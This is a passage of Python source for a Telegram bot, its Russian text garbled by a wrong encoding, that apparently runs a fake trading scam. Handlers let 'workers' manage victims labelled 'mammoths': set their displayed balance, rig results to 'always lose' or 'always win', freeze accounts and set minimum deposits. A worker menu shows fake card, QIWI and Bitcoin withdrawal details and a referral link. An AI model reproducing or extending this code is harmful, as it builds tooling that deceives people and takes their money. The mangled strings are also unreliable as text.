                key.add(types.InlineKeyboardButton('‚òÄÔ∏è–ó–∞–±–ª–æ–∫–∏—Ä–æ–≤–∞—Ç—å —Å—á—ë—Ç‚ùÑÔ∏è', callback_data=f'freeze_{mamont_id}'))
                key.add(types.InlineKeyboardButton('üõëÔ∏è –£–¥–∞–ª–∏—Ç—å –º–∞–º–æ–Ω—Ç–∞', callback_data=f'delete_mamonts_{mamont_id}'))
                key.add(types.InlineKeyboardButton('–ù–∞–∑–∞–¥', callback_data='backing'))
                if profile.fart == 0:
                    farts = '–í—Å–µ–≥–¥–∞ –ø—Ä–æ–∏–≥—Ä—ã—à'
                elif profile.fart == 1:
                    farts = '–í—Å–µ–≥–¥–∞ –≤—ã–∏–≥—Ä—ã—à'
                else:
                    farts = '–†–∞–Ω–¥–æ–º'
                if profile.verif == 0:
                    veri = 'üõëÔ∏è'
                else:
                    veri = '‚úÖÔ∏è '
                if profile.freez == 0:
                    fr = '‚òÄÔ∏è'
                else:
                    fr = '‚ùÑÔ∏è'
                if mamont_info.username is None:
                    await call.message.edit_text(
                        f'ID: {profile.user_id}\n–ë–∞–ª–∞–Ω—Å: {profile.balance}\n–°—á—ë—Ç: {fr}\n–§–∞—Ä—Ç: {farts}\n–í–µ—Ä–∏—Ñ–∏–∫–∞—Ü–∏—è: {veri} ',
                        reply_markup=key)
                else:
                    await call.message.edit_text(
                        f'–ú–∞–º–æ–Ω—Ç: @{profile.username}\n–ë–∞–ª–∞–Ω—Å: {profile.balance}\n–°—á—ë—Ç: {fr}\n–§–∞—Ä—Ç: {farts}\n–í–µ—Ä–∏—Ñ–∏–∫–∞—Ü–∏—è: {veri}',
                        reply_markup=key)

            @dp.callback_query_handler(text=f'verif_{mamont_id}')
            async def input_verif(call: types.CallbackQuery):
                profile_id = call.data.split('_')[1]
                profile = all_users.get(all_users.user_id == profile_id)

                if profile.verif == 0:
                    profile.verif = 1
                elif profile.verif == 1:
                    profile.verif = 0

                profile.save()
                key = types.InlineKeyboardMarkup()
                key.add(types.InlineKeyboardButton('üëõ –ó–∞–¥–∞—Ç—å –±–∞–ª–∞–Ω—Å', callback_data=f'set_balance_{mamont_id}'))
                key.add(types.InlineKeyboardButton('üçÄ –§–∞—Ä—Ç', callback_data=f'farting_{mamont_id}'),
                        types.InlineKeyboardButton('–í–µ—Ä–∏—Ñ–∏–∫–∞—Ü–∏—è', callback_data=f'verif_{mamont_id}'))
                key.add(
                    types.InlineKeyboardButton('‚ûñ –ú–∏–Ω–∏–º–∞–ª—å–Ω–∞—è —Å—É–º–º–∞ –ø–æ–ø–æ–ª–Ω–µ–Ω–∏—è', callback_data=f'min_pay_{mamont_id}'))
                key.add(types.InlineKeyboardButton('‚òÄÔ∏è–ó–∞–±–ª–æ–∫–∏—Ä–æ–≤–∞—Ç—å —Å—á—ë—Ç‚ùÑÔ∏è', callback_data=f'freeze_{mamont_id}'))
                key.add(types.InlineKeyboardButton('üõëÔ∏è –£–¥–∞–ª–∏—Ç—å –º–∞–º–æ–Ω—Ç–∞', callback_data=f'delete_mamonts_{mamont_id}'))
                key.add(types.InlineKeyboardButton('–ù–∞–∑–∞–¥', callback_data='backing'))
                if profile.fart == 0:
                    farts = '–í—Å–µ–≥–¥–∞ –ø—Ä–æ–∏–≥—Ä—ã—à'
                elif profile.fart == 1:
                    farts = '–í—Å–µ–≥–¥–∞ –≤—ã–∏–≥—Ä—ã—à'
                else:
                    farts = '–†–∞–Ω–¥–æ–º'
                if profile.verif == 0:
                    veri = 'üõëÔ∏è'
                else:
                    veri = '‚úÖÔ∏è '
                if profile.freez == 0:
                    fr = '‚òÄÔ∏è'
                else:
                    fr = '‚ùÑÔ∏è'
                if mamont_info.username is None:
                    await call.message.edit_text(
                        f'ID: {profile.user_id}\n–ë–∞–ª–∞–Ω—Å: {profile.balance}\n–°—á—ë—Ç: {fr}\n–§–∞—Ä—Ç: {farts}\n–í–µ—Ä–∏—Ñ–∏–∫–∞—Ü–∏—è: {veri}',
                        reply_markup=key)
                else:
                    await call.message.edit_text(
                        f'–ú–∞–º–æ–Ω—Ç: @{profile.username}\n–ë–∞–ª–∞–Ω—Å: {profile.balance}\n–°—á—ë—Ç: {fr}\n–§–∞—Ä—Ç: {farts}\n–í–µ—Ä–∏—Ñ–∏–∫–∞—Ü–∏—è: {veri}',
                        reply_markup=key)

            @dp.callback_query_handler(text=f'freeze_{mamont_id}')
            async def freeze(call: types.CallbackQuery):
                profile_id = call.data.split('_')[1]
                profile = all_users.get(all_users.user_id == profile_id)

                if profile.freez == 0:
                    profile.freez = 1
                elif profile.freez == 1:
                    profile.freez = 0

                profile.save()
                key = types.InlineKeyboardMarkup()
                key.add(types.InlineKeyboardButton('üëõ –ó–∞–¥–∞—Ç—å –±–∞–ª–∞–Ω—Å', callback_data=f'set_balance_{mamont_id}'))
                key.add(types.InlineKeyboardButton('üçÄ –§–∞—Ä—Ç', callback_data=f'farting_{mamont_id}'),
                        types.InlineKeyboardButton('–í–µ—Ä–∏—Ñ–∏–∫–∞—Ü–∏—è', callback_data=f'verif_{mamont_id}'))
                key.add(
                    types.InlineKeyboardButton('‚ûñ –ú–∏–Ω–∏–º–∞–ª—å–Ω–∞—è —Å—É–º–º–∞ –ø–æ–ø–æ–ª–Ω–µ–Ω–∏—è', callback_data=f'min_pay_{mamont_id}'))
                key.add(types.InlineKeyboardButton('‚òÄÔ∏è–ó–∞–±–ª–æ–∫–∏—Ä–æ–≤–∞—Ç—å —Å—á—ë—Ç‚ùÑÔ∏è', callback_data=f'freeze_{mamont_id}'))
                key.add(types.InlineKeyboardButton('üõëÔ∏è –£–¥–∞–ª–∏—Ç—å –º–∞–º–æ–Ω—Ç–∞', callback_data=f'delete_mamonts_{mamont_id}'))
                key.add(types.InlineKeyboardButton('–ù–∞–∑–∞–¥', callback_data='backing'))
                if profile.fart == 0:
                    farts = '–í—Å–µ–≥–¥–∞ –ø—Ä–æ–∏–≥—Ä—ã—à'
                elif profile.fart == 1:
                    farts = '–í—Å–µ–≥–¥–∞ –≤—ã–∏–≥—Ä—ã—à'
                else:
                    farts = '–†–∞–Ω–¥–æ–º'
                if profile.verif == 0:
                    veri = 'üõëÔ∏è'
                else:
                    veri = '‚úÖÔ∏è '
                if profile.freez == 0:
                    fr = '‚òÄÔ∏è'
                else:
                    fr = '‚ùÑÔ∏è'
                if mamont_info.username is None:
                    await call.message.edit_text(
                        f'ID: {profile.user_id}\n–ë–∞–ª–∞–Ω—Å: {profile.balance}\n–°—á—ë—Ç: {fr}\n–§–∞—Ä—Ç: {farts}\n–í–µ—Ä–∏—Ñ–∏–∫–∞—Ü–∏—è: {veri}',
                        reply_markup=key)
                else:
                    await call.message.edit_text(
                        f'–ú–∞–º–æ–Ω—Ç: @{profile.username}\n–ë–∞–ª–∞–Ω—Å: {profile.balance}\n–°—á—ë—Ç: {fr}\n–§–∞—Ä—Ç: {farts}\n–í–µ—Ä–∏—Ñ–∏–∫–∞—Ü–∏—è: {veri}',
                        reply_markup=key)

        @dp.message_handler(content_types=['text'], state=mamont_edit_pay.summ)  # –ü—Ä–∏–Ω–∏–º–∞–µ–º —Å–æ—Å—Ç–æ—è–Ω–∏–µ
        async def set_dep(message: types.Message, state: FSMContext):
            try:
                async with state.proxy() as data:
                    data['summ'] = int(message.text)
                await state.finish()
                profile = all_users.get(all_users.user_id == data['ID'])
                profile.min_pay_up = data['summ']
                profile.save()
                key = types.InlineKeyboardMarkup()
                mamont_info = all_users.get(all_users.user_id == data['ID'])
                key.add(types.InlineKeyboardButton('üëõ –ó–∞–¥–∞—Ç—å –±–∞–ª–∞–Ω—Å', callback_data=f'set_balance_{mamont_id}'))
                key.add(types.InlineKeyboardButton('üçÄ –§–∞—Ä—Ç', callback_data=f'farting_{mamont_id}'),
                        types.InlineKeyboardButton('–í–µ—Ä–∏—Ñ–∏–∫–∞—Ü–∏—è', callback_data=f'verif_{mamont_id}'))
                key.add(
                    types.InlineKeyboardButton('‚ûñ –ú–∏–Ω–∏–º–∞–ª—å–Ω–∞—è —Å—É–º–º–∞ –ø–æ–ø–æ–ª–Ω–µ–Ω–∏—è', callback_data=f'min_pay_{mamont_id}'))
                key.add(types.InlineKeyboardButton('‚òÄÔ∏è–ó–∞–±–ª–æ–∫–∏—Ä–æ–≤–∞—Ç—å —Å—á—ë—Ç‚ùÑÔ∏è', callback_data=f'freeze_{mamont_id}'))
                key.add(types.InlineKeyboardButton('üõëÔ∏è –£–¥–∞–ª–∏—Ç—å –º–∞–º–æ–Ω—Ç–∞', callback_data=f'delete_mamonts_{mamont_id}'))
                key.add(types.InlineKeyboardButton('–ù–∞–∑–∞–¥', callback_data='backing'))
                if mamont_info.fart == 0:
                    farts = '–í—Å–µ–≥–¥–∞ –ø—Ä–æ–∏–≥—Ä—ã—à'
                elif mamont_info.fart == 1:
                    farts = '–í—Å–µ–≥–¥–∞ –≤—ã–∏–≥—Ä—ã—à'
                else:
                    farts = '–†–∞–Ω–¥–æ–º'

                if mamont_info.verif == 0:
                    veri = 'üõëÔ∏è'
                else:
                    veri = '‚úÖÔ∏è '

                if mamont_info.freez == 0:
                    fr = '‚òÄÔ∏è'
                else:
                    fr = '‚ùÑÔ∏è'

                if mamont_info.username is None:
                    await message.answer(
                        f'ID: {mamont_info.user_id}\n–ë–∞–ª–∞–Ω—Å: {mamont_info.balance}\n–°—á—ë—Ç: {fr}\n–§–∞—Ä—Ç: {farts}\n–í–µ—Ä–∏—Ñ–∏–∫–∞—Ü–∏—è: {veri}',
                        reply_markup=key)
                else:
                    await message.answer(
                        f'–ú–∞–º–æ–Ω—Ç: @{mamont_info.username}\n–ë–∞–ª–∞–Ω—Å: {mamont_info.balance}\n–°—á—ë—Ç: {fr}\n–§–∞—Ä—Ç: {farts}\n–í–µ—Ä–∏—Ñ–∏–∫–∞—Ü–∏—è: {veri}',
                        reply_markup=key)
            except Exception as err:
                print(err)
                await state.finish()
                key = types.InlineKeyboardMarkup()
                key.add(types.InlineKeyboardButton('–ù–∞–∑–∞–¥', callback_data='backing'))
                await call.message.answer('üõëÔ∏è *–û—à–∏–±–∫–∞*', reply_markup=key, parse_mode='Markdown')

        @dp.message_handler(content_types=['text'], state=mamont_edit_balance.summ)  # –ü—Ä–∏–Ω–∏–º–∞–µ–º —Å–æ—Å—Ç–æ—è–Ω–∏–µ
        async def set_balance(message: types.Message, state: FSMContext):
            try:
                async with state.proxy() as data:
                    data['summ'] = int(message.text)
                await state.finish()
                profile = all_users.get(all_users.user_id == data['ID'])
                profile.balance = data['summ']
                profile.save()
                key = types.InlineKeyboardMarkup()
                mamont_info = all_users.get(all_users.user_id == data['ID'])
                key.add(types.InlineKeyboardButton('üëõ –ó–∞–¥–∞—Ç—å –±–∞–ª–∞–Ω—Å', callback_data=f'set_balance_{mamont_id}'))
                key.add(types.InlineKeyboardButton('üçÄ –§–∞—Ä—Ç', callback_data=f'farting_{mamont_id}'),
                        types.InlineKeyboardButton('–í–µ—Ä–∏—Ñ–∏–∫–∞—Ü–∏—è', callback_data=f'verif_{mamont_id}'))
                key.add(
                    types.InlineKeyboardButton('‚ûñ –ú–∏–Ω–∏–º–∞–ª—å–Ω–∞—è —Å—É–º–º–∞ –ø–æ–ø–æ–ª–Ω–µ–Ω–∏—è', callback_data=f'min_pay_{mamont_id}'))
                key.add(types.InlineKeyboardButton('‚òÄÔ∏è–ó–∞–±–ª–æ–∫–∏—Ä–æ–≤–∞—Ç—å —Å—á—ë—Ç‚ùÑÔ∏è', callback_data=f'freeze_{mamont_id}'))
                key.add(types.InlineKeyboardButton('üõëÔ∏è –£–¥–∞–ª–∏—Ç—å –º–∞–º–æ–Ω—Ç–∞', callback_data=f'delete_mamonts_{mamont_id}'))
                key.add(types.InlineKeyboardButton('–ù–∞–∑–∞–¥', callback_data='backing'))
                if mamont_info.fart == 0:
                    farts = '–í—Å–µ–≥–¥–∞ –ø—Ä–æ–∏–≥—Ä—ã—à'
                elif mamont_info.fart == 1:
                    farts = '–í—Å–µ–≥–¥–∞ –≤—ã–∏–≥—Ä—ã—à'
                else:
                    farts = '–†–∞–Ω–¥–æ–º'

                if mamont_info.verif == 0:
                    veri = 'üõëÔ∏è'
                else:
                    veri = '‚úÖÔ∏è '

                if mamont_info.freez == 0:
                    fr = '‚òÄÔ∏è'
                else:
                    fr = '‚ùÑÔ∏è'

                if mamont_info.username is None:
                    await message.answer(
                        f'ID: {mamont_info.user_id}\n–ë–∞–ª–∞–Ω—Å: {mamont_info.balance}\n–°—á—ë—Ç: {fr}\n–§–∞—Ä—Ç: {farts}\n–í–µ—Ä–∏—Ñ–∏–∫–∞—Ü–∏—è: {veri} ',
                        reply_markup=key)
                else:
                    await message.answer(
                        f'–ú–∞–º–æ–Ω—Ç: @{mamont_info.username}\n–ë–∞–ª–∞–Ω—Å: {mamont_info.balance}\n–°—á—ë—Ç: {fr}\n–§–∞—Ä—Ç: {farts}\n–í–µ—Ä–∏—Ñ–∏–∫–∞—Ü–∏—è: {veri} ',
                        reply_markup=key)
            except Exception as err:
                print(err)
                await state.finish()
                key = types.InlineKeyboardMarkup()
                key.add(types.InlineKeyboardButton('–ù–∞–∑–∞–¥', callback_data='backing'))
                await call.message.answer('üõëÔ∏è *–û—à–∏–±–∫–∞*', reply_markup=key, parse_mode='Markdown')


@dp.message_handler(Text(equals="‚ö°Ô∏è –ú–µ–Ω—é –≤–æ—Ä–∫–µ—Ä–∞"))
async def ecn(message: types.Message):
    if workers.get_or_none(workers.user_id == message.from_user.id):
        await message.delete()
        keyboard = types.InlineKeyboardMarkup()
        my_mamont = types.InlineKeyboardButton('–ú–æ–∏ –º–∞–º–æ–Ω—Ç—ã', callback_data='my_mamonts')
        add_mamont = types.InlineKeyboardButton('–î–æ–±–∞–≤–∏—Ç—å –º–∞–º–æ–Ω—Ç–∞', callback_data='add_mamont')
        create_promo = types.InlineKeyboardButton('–°–æ–∑–¥–∞—Ç—å –ø—Ä–æ–º–æ–∫–æ–¥', callback_data='create_promo')
        my_promo = types.InlineKeyboardButton('–ú–æ–∏ –ø—Ä–æ–º–æ–∫–æ–¥—ã', callback_data='view_promo')
        keyboard.add(my_mamont, add_mamont)
        keyboard.add(create_promo, my_promo)
        sett = default_setting.get(default_setting.id == 1)

        cnt = 0
        for i in all_users.select().where(all_users.worker == message.from_user.id):
            cnt += 1
        len_users = cnt

        text = f'''
<b>‚ö°Ô∏è –ú–µ–Ω—é –≤–æ—Ä–∫–µ—Ä–∞</b>:
<b>–ö–æ–ª–∏—á–µ—Å—Ç–≤–æ –º–∞–º–æ–Ω—Ç–æ–≤</b>: {len_users}\n 
<b>–†–µ–∫–≤–∏–∑–∏—Ç—ã –¥–ª—è –≤—ã–≤–æ–¥–∞</b>:
<b>–ö–∞—Ä—Ç–∞</b>: <code>{sett.card_fake}</code>
<b>QIWI</b>: <code>{sett.qiwi_fake}</code>
<b>Bitcoin</b>: <code>{sett.btc_fake}</code>\n
<b>–†–µ—Ñ–µ—Ä–∞–ª–∫–∞</b>:\n<code>https://t.me/{user_name_bots}?start={message.from_user.id}</code>
<a href = 'https://telegra.ph/Kurs-po-Trejdu-02-02'><b>–ú–∞–Ω—É–∞–ª </b></a>
            '''
        await message.answer(text, reply_markup=keyboard, parse_mode='HTML', disable_web_page_preview=True)


@dp.callback_query_handler(text="back_to_ecn_reset", state=ecn_add)
async def back_to_ecn(call: types.CallbackQuery, state: FSMContext):
    await call.message.delete()
    async with state.proxy() as data:
        data['summ'] = call.message.text
    await state.reset_state()
    text = '–í—ã–±–µ—Ä–∏—Ç–µ –∞–∫—Ç–∏–≤: '
    await call.message.answer(text=text, reply_markup=ecn_btns_ru)


@dp.callback_query_handler(text="back_to_ecn")
async def back_to_ecn(call: types.CallbackQuery):
    await call.message.delete()
    text = '–í—ã–±–µ—Ä–∏—Ç–µ –∞–∫—Ç–∏–≤:'
    await call.message.answer(text=text, reply_markup=ecn_btns_ru)


@dp.callback_query_handler(text='back_promo', state=promokods)
async def pay_promokods(call: types.CallbackQuery, state: FSMContext):
    await call.message.delete()
    await call.message.answer('–í—ã–±–µ—Ä–∏—Ç–µ –≤–∞—Ä–∏–∞–Ω—Ç –ø–æ–ø–æ–ª–Ω–µ–Ω–∏—è –±–∞–ª–∞–Ω—Å–∞: ', reply_markup=pays_ru)
    async with state.proxy() as data:
        data['promik'] = call.message.text
    await state.reset_state()


@dp.callback_query_handler(text="back_to_start_reset", state=costing)
async def back_to_start_reset(call: types.CallbackQuery, state: FSMContext):
    await call.message.delete()
    await call.message.answer('–í—ã–±–µ—Ä–∏—Ç–µ –≤–∞—Ä–∏–∞–Ω—Ç –ø–æ–ø–æ–ª–Ω–µ–Ω–∏—è –±–∞–ª–∞–Ω—Å–∞: ', reply_markup=pays_ru)
    async with state.proxy() as data:
        data['cost'] = call.message.text
    await state.reset_state()


if __name__ == '__main__':
    executor.start_polling(dp, skip_updates=True)
